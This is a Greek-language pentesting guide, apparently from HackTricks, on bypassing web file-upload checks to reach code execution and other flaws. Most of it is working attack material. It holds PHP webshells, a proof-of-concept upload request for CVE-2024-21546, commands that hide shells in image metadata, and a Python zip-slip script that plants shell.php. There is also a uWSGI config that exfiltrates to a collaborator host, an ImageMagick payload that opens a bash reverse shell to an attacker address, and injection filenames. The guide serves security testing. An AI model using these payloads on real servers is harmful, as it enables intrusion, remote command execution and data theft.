# Αποστολή αρχείων

{{#include ../../banners/hacktricks-training.md}}

## Γενική Μεθοδολογία για Αποστολή Αρχείων

Άλλες χρήσιμες επεκτάσεις:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Παράκαμψη ελέγχων καταλήξεων αρχείων

1. Αν ισχύουν, **ελέγξτε** τις **παραπάνω επεκτάσεις.** Δοκιμάστε επίσης με **κεφαλαία γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Ελέγξτε **το να προσθέσετε μια έγκυρη επέκταση πριν** από την επέκταση εκτέλεσης (χρησιμοποιήστε και τις προηγούμενες επεκτάσεις):_
- _file.png.php_
- _file.png.Php5_
3. Δοκιμάστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε το Burp για να **bruteforce** όλους τους **ascii** και **Unicode** χαρακτήρες. (_Σημείωση: μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγουμένως** αναφερόμενες **επεκτάσεις**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τις προστασίες **ξεγελώντας τον parser των επεκτάσεων** στην πλευρά του server με τεχνικές όπως **διπλασιασμός** της **επέκτασης** ή **προσθήκη junk δεδομένων** (**null** bytes) μεταξύ επεκτάσεων. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να φτιάξετε καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **άλλο ένα επίπεδο επεκτάσεων** στον προηγούμενο έλεγχο:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Προσπαθήστε να βάλετε την **επέκταση εκτέλεσης πριν από την έγκυρη επέκταση** και ελπίζετε ότι ο server είναι λανθασμένα ρυθμισμένος. (χρήσιμο για εκμετάλλευση λανθασμένων ρυθμίσεων Apache όπου οτιδήποτε με επέκταση **.php**, αλλά όχι απαραίτητα καταλήγοντας σε .php, θα εκτελέσει κώδικα):
- _ex: file.php.png_
7. Χρήση των **NTFS alternate data stream (ADS)** στα **Windows**. Σε αυτή την περίπτωση, ένας χαρακτήρας ":" θα εισαχθεί μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπόμενη. Ως αποτέλεσμα, ένα **κενό αρχείο με την απαγορευμένη επέκταση** θα δημιουργηθεί στον server (π.χ. "file.asax:.jpg"). Αυτό το αρχείο μπορεί να τροποποιηθεί αργότερα με άλλες τεχνικές όπως η χρήση του short filename. Το μοτίβο "**::$data**" μπορεί επίσης να χρησιμοποιηθεί για να δημιουργήσει μη-κενά αρχεία. Επομένως, η προσθήκη μιας τελείας μετά από αυτό το μοτίβο μπορεί επίσης να βοηθήσει στην παράκαμψη περαιτέρω περιορισμών (π.χ. "file.asp::$data.")
8. Δοκιμάστε να σπάσετε τα όρια του ονόματος αρχείου. Η έγκυρη επέκταση κόβεται. Και το κακόβουλο PHP παραμένει. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Κάποιοι upload handlers αφαιρούν ή κανονικοποιούν τους τελείες (trailing dot) από το αποθηκευμένο όνομα αρχείου. Στην UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) εκδόσεις πριν την 2.9.1, μπορείτε να παρακάμψετε τον έλεγχο επεκτάσεων κάνοντας:

- Χρησιμοποιώντας ένα έγκυρο image MIME και magic header (π.χ., PNG’s `\x89PNG\r\n\x1a\n`).
- Ονομάζοντας το ανέβασμα αρχείο με επέκταση PHP ακολουθούμενη από τελεία, π.χ., `shell.php.`
- Ο server αφαιρεί την trailing dot και αποθηκεύει `shell.php`, το οποίο θα εκτελεστεί αν τοποθετηθεί σε ένα web-served directory (default public storage like `/storage/files/`).

Ελάχιστο PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Έπειτα, επισκεφθείτε την αποθηκευμένη διαδρομή (τυπικό σε Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Μέτρα αντιμετώπισης:
- Αναβαθμίστε unisharp/laravel-filemanager σε ≥ 2.9.1.
- Επιβάλτε αυστηρές server-side allowlists και επαληθεύστε ξανά το persisted filename.
- Εξυπηρετήστε τα uploads από μη-εκτελέσιμες τοποθεσίες.

### Παρακάμψτε Content-Type, Magic Number, Compression & Resizing

- Παρακάμψτε τους ελέγχους του **Content-Type** ρυθμίζοντας την **τιμή** της **επικεφαλίδας** **Content-Type** σε: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Παρακάμψτε τον έλεγχο του **magic number** προσθέτοντας στην αρχή του αρχείου τα **bytes of a real image** (confuse the _file_ command). Ή εισάγετε το shell μέσα στα **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
ή μπορείτε επίσης να **εισάγετε το payload απευθείας** σε μια εικόνα:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Αν στην εικόνα σας εφαρμόζεται **compressions**, για παράδειγμα χρησιμοποιώντας κάποιες standard PHP βιβλιοθήκες όπως [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές δεν θα είναι χρήσιμες. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **επιβιώσει τη συμπίεση**.
- [**Github με τον κώδικα**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Η web σελίδα θα μπορούσε επίσης να **αναδιαστασιολογεί** την **εικόνα**, χρησιμοποιώντας για παράδειγμα τις PHP-GD συναρτήσεις `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **επιβιώσει τη συμπίεση**.
- [**Github με τον κώδικα**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Μια άλλη τεχνική για να φτιάξετε ένα payload που **επιβιώνει ένα image resizing**, χρησιμοποιώντας τη συνάρτηση PHP-GD `thumbnailImage`. Εναλλακτικά, μπορείτε να χρησιμοποιήσετε το **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **επιβιώσει τη συμπίεση**.
- [**Github με τον κώδικα**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Άλλα κόλπα για δοκιμή

- Βρείτε μια ευπάθεια για να **μετονομάσετε** το αρχείο που έχει ήδη ανέβει (για να αλλάξετε την επέκταση).
- Βρείτε μια ευπάθεια **Local File Inclusion** για να εκτελέσετε το backdoor.
- Πιθανή αποκάλυψη πληροφοριών:
1. Ανεβάστε **πολλές φορές** (και **ταυτόχρονα**) το **ίδιο αρχείο** με το **ίδιο όνομα**
2. Ανεβάστε ένα αρχείο με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Ανεβάζοντας ένα αρχείο με **"." , "..", ή "..."** ως όνομα. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα uploaded files στον κατάλογο "/www/uploads/", το όνομα αρχείου "." θα δημιουργήσει ένα αρχείο που ονομάζεται "uploads" στον κατάλογο "/www/".
4. Ανεβάστε ένα αρχείο που ίσως δεν διαγράφεται εύκολα, όπως **"...:.jpg"** σε **NTFS**. (Windows)
5. Ανεβάστε ένα αρχείο σε **Windows** με **μη έγκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Ανεβάστε ένα αρχείο σε **Windows** χρησιμοποιώντας **reserved** (**απαγορευμένα**) **ονόματα** όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, και LPT9.
- Δοκιμάστε επίσης να **ανεβάσετε ένα εκτελέσιμο** (.exe) ή ένα **.html** (λιγότερο ύποπτο) που **θα εκτελέσει κώδικα** όταν ανοιχτεί κατά λάθος από το θύμα.

### Ειδικά κόλπα για επεκτάσεις

Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **PHP server**, [ρίξτε μια ματιά στο κόλπο **.htaccess** για εκτέλεση κώδικα](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **ASP server**, [ρίξτε μια ματιά στο κόλπο **.config** για εκτέλεση κώδικα](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Τα αρχεία `.phar` είναι σαν τα `.jar` για java, αλλά για php, και μπορούν να **χρησιμοποιηθούν σαν php αρχείο** (εκτελώντας τα με php, ή συμπεριλαμβάνοντάς τα μέσα σε ένα script...)

Η επέκταση `.inc` χρησιμοποιείται μερικές φορές για php αρχεία που χρησιμοποιούνται μόνο για **εισαγωγή αρχείων**, οπότε, κάποια στιγμή, κάποιος μπορεί να έχει επιτρέψει **την εκτέλεση αυτής της επέκτασης**.

## **Jetty RCE**

Αν μπορείτε να ανεβάσετε ένα XML αρχείο σε έναν Jetty server μπορείτε να αποκτήσετε [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Έτσι, όπως αναφέρεται στην παρακάτω εικόνα, ανεβάστε το XML αρχείο στο `$JETTY_BASE/webapps/` και περιμένετε το shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Για λεπτομερή διερεύνηση αυτής της ευπάθειας δείτε την αρχική έρευνα: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Ευπάθειες Remote Command Execution (RCE) μπορούν να εκμεταλλευτούν σε uWSGI servers εάν κάποιος έχει τη δυνατότητα να τροποποιήσει το αρχείο ρυθμίσεων `.ini`. Τα αρχεία ρυθμίσεων του uWSGI χρησιμοποιούν μια συγκεκριμένη σύνταξη για να ενσωματώνουν "magic" μεταβλητές, placeholders, και operators. Σημειωτέον, ο τελεστής '@', χρησιμοποιούμενος ως `@(filename)`, έχει σχεδιαστεί για να συμπεριλαμβάνει τα περιεχόμενα ενός αρχείου. Μεταξύ των διαφόρων υποστηριζόμενων schemes στο uWSGI, το scheme "exec" είναι ιδιαίτερα ισχυρό, επιτρέποντας την ανάγνωση δεδομένων από το standard output μιας διεργασίας. Αυτή η δυνατότητα μπορεί να χειραγωγηθεί για κακόβουλους σκοπούς όπως Remote Command Execution ή Arbitrary File Write/Read όταν επεξεργάζεται ένα αρχείο `.ini`.

Εξετάστε το παρακάτω παράδειγμα ενός κακόβουλου `uwsgi.ini` αρχείου, που παρουσιάζει διάφορα schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload συμβαίνει κατά την ανάλυση του αρχείου διαμόρφωσης. Για να ενεργοποιηθεί και να αναλυθεί η διαμόρφωση, η διεργασία uWSGI πρέπει είτε να επανεκκινηθεί (ενδεχομένως μετά από crash ή λόγω ενός Denial of Service attack) είτε το αρχείο να ρυθμιστεί για auto-reload. Η λειτουργία auto-reload, εάν είναι ενεργοποιημένη, φορτώνει ξανά το αρχείο σε καθορισμένα διαστήματα όταν εντοπίζει αλλαγές.

Είναι κρίσιμο να κατανοήσετε την ελαστική/χαλαρή φύση του τρόπου ανάλυσης του αρχείου διαμόρφωσης από το uWSGI. Συγκεκριμένα, το payload που συζητήθηκε μπορεί να εισαχθεί μέσα σε ένα δυαδικό αρχείο (όπως μια εικόνα ή ένα PDF), διευρύνοντας περαιτέρω το πεδίο πιθανής εκμετάλλευσης.

## **wget File Upload/SSRF Trick**

Σε ορισμένες περιπτώσεις μπορεί να διαπιστώσετε ότι ένας διακομιστής χρησιμοποιεί **`wget`** για να **κατεβάζει αρχεία** και μπορείτε να **υποδείξετε** το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι η επέκταση των αρχείων που κατεβαίνουν είναι μέσα σε μια whitelist για να διασφαλίσει ότι θα κατεβούν μόνο επιτρεπτά αρχεία. Ωστόσο, **this check can be bypassed.**\
Το **μέγιστο** μήκος ενός **ονόματος αρχείου** σε **linux** είναι **255**, ωστόσο, το **wget** περικόπτει τα ονόματα αρχείων σε **236** χαρακτήρες. Μπορείτε να **κατεβάσετε ένα αρχείο που ονομάζεται "A"\*232+".php"+".gif"**, αυτό το όνομα αρχείου θα **bypass** τον **έλεγχο** (όπως σε αυτό το παράδειγμα **".gif"** είναι μια **έγκυρη** επέκταση) αλλά `wget` θα **μετονομάσει** το αρχείο σε **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Σημειώστε ότι **άλλη επιλογή** που ίσως σκέφτεστε για να παρακάμψετε αυτόν τον έλεγχο είναι να κάνετε τον **HTTP server να ανακατευθύνει σε διαφορετικό αρχείο**, έτσι το αρχικό URL θα παρακάμψει τον έλεγχο και στη συνέχεια το wget θα κατεβάσει το ανακατευθυνόμενο αρχείο με το νέο όνομα. Αυτό **δεν θα λειτουργήσει** **εκτός αν** το wget χρησιμοποιείται με το **παράμετρο** `--trust-server-names` επειδή **το wget θα κατεβάσει τη σελίδα που ανακατεύθυνε με το όνομα του αρχείου που υποδεικνύεται στο αρχικό URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) είναι ένα ισχυρό εργαλείο σχεδιασμένο για να βοηθά Pentesters και Bug Hunters στο testing των μηχανισμών file upload. Χρησιμοποιεί διάφορες bug bounty τεχνικές για να απλοποιήσει τη διαδικασία εντοπισμού και εκμετάλλευσης ευπαθειών, εξασφαλίζοντας σχολαστικές αξιολογήσεις των web applications.

### Corrupting upload indices with snprintf quirks (historical)

Κάποιοι legacy upload handlers που χρησιμοποιούν το `snprintf()` ή παρόμοιο για να φτιάξουν multi-file arrays από ένα single-file upload μπορούν να εξαπατηθούν ώστε να πλαστογραφήσουν τη δομή `_FILES`. Λόγω ασυνεπειών και αποκοπής στη συμπεριφορά του `snprintf()`, ένα προσεκτικά κατασκευασμένο single upload μπορεί να εμφανιστεί ως πολλαπλά αρχεία με δείκτες στην πλευρά του server, μπερδεύοντας λογική που υποθέτει αυστηρό σχήμα (π.χ. το χειρίζεται ως multi-file upload και παίρνει μη ασφαλείς διαδρομές). Παρότι είναι πιο εξειδικευμένο σήμερα, αυτό το pattern “index corruption” εμφανίζεται περιστασιακά σε CTFs και παλιές βάσεις κώδικα.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Αν μπορείτε να υποδείξετε στον web server να πιάσει μια εικόνα από ένα URL, μπορείτε να προσπαθήσετε να καταχραστείτε ένα [SSRF](../ssrf-server-side-request-forgery/index.html). Αν αυτή η **image** πρόκειται να **αποθηκευτεί** σε κάποιο **public** site, μπορείτε επίσης να υποδείξετε ένα URL από [https://iplogger.org/invisible/](https://iplogger.org/invisible/) και να **κλέψετε πληροφορίες κάθε επισκέπτη**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Ειδικά διαμορφωμένα PDFs για XSS: Η [ακόλουθη σελίδα παρουσιάζει πώς να **ενθέσετε δεδομένα PDF για να αποκτήσετε εκτέλεση JS**](../xss-cross-site-scripting/pdf-injection.md). Αν μπορείτε να ανεβάσετε PDFs, μπορείτε να ετοιμάσετε κάποιο PDF που θα εκτελέσει αυθαίρετο JS σύμφωνα με τις δοθείσες οδηγίες.
- Ανεβάστε το \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) περιεχόμενο για να ελέγξετε αν ο server έχει κάποιο **antivirus**
- Ελέγξτε αν υπάρχει κάποιο **όριο μεγέθους** κατά το uploading αρχείων

Ακολουθεί μια λίστα top 10 πραγμάτων που μπορείτε να πετύχετε ανεβάζοντας αρχεία (από [εδώ](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Ανεβάστε ένα archive που περιέχει soft links προς άλλα αρχεία, τότε, προσπελάζοντας τα αποσυμπιεσμένα αρχεία θα έχετε πρόσβαση στα linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Αποσυμπίεση σε διαφορετικούς φακέλους

Η απρόσμενη δημιουργία αρχείων σε καταλόγους κατά την αποσυμπίεση είναι ένα σημαντικό πρόβλημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να αποτρέψει την εκτέλεση εντολών σε επίπεδο OS μέσω κακόβουλων file uploads, η υποστήριξη ιεραρχικής συμπίεσης και οι δυνατότητες directory traversal του μορφότυπου ZIP μπορούν να εκμεταλλευτούν. Αυτό επιτρέπει στους επιτιθέμενους να παρακάμπτουν περιορισμούς και να διαφεύγουν από ασφαλείς upload directories χειραγωγώντας τη λειτουργία αποσυμπίεσης της στοχευμένης εφαρμογής.

Ένα αυτοματοποιημένο exploit για τη δημιουργία τέτοιων αρχείων είναι διαθέσιμο στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Το εργαλείο μπορεί να χρησιμοποιηθεί ως εξής:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, το **symlink trick with evilarc** είναι μια επιλογή. Αν ο στόχος είναι να στοχεύσετε ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργήσετε ένα symlink προς αυτό το αρχείο στο σύστημά σας. Αυτό εξασφαλίζει ότι το evilarc δεν θα συναντήσει σφάλματα κατά τη λειτουργία του.

Παρακάτω είναι ένα παράδειγμα Python code που χρησιμοποιείται για να δημιουργήσει ένα malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Κατάχρηση συμπίεσης για file spraying**

Για περισσότερες λεπτομέρειες **δείτε το αρχικό άρθρο στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Γράφεται PHP κώδικας που εκτελεί εντολές που περνιούνται μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Δημιουργούνται πολλά αρχεία και συγκεντρώνεται ένα αρχείο zip που περιέχει αυτά τα αρχεία.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Τα ονόματα των αρχείων μέσα στο zip τροποποιούνται χρησιμοποιώντας vi ή έναν hex editor, αλλάζοντας το "xxA" σε "../" για να πραγματοποιηθεί directory traversal.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με επέκταση εικόνας για να εκμεταλλευτείτε την ευπάθεια **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP Shell σε PNG

Η ενσωμάτωση ενός PHP shell στο chunk IDAT ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από την PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συνήθως για αλλαγή μεγέθους και resampling εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες αποτελεί σημαντικό πλεονέκτημα για ορισμένες χρήσεις.

Μια λεπτομερής διερεύνηση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των πιθανών εφαρμογών, παρέχεται στο ακόλουθο άρθρο: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Αυτός ο πόρος προσφέρει μια ολοκληρωμένη κατανόηση της διαδικασίας και των επιπτώσεών της.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files αποτελούν ένα μοναδικό εργαλείο στην ασφάλεια στον κυβερνοχώρο, λειτουργώντας σαν χαμαιλέοντες που μπορούν νόμιμα να υπάρχουν σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι το [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα υβρίδιο που λειτουργεί και ως GIF και ως RAR archive. Τέτοια αρχεία δεν περιορίζονται σε αυτό το ζεύγος· συνδυασμοί όπως GIF και JS ή PPT και JS είναι επίσης εφικτοί.

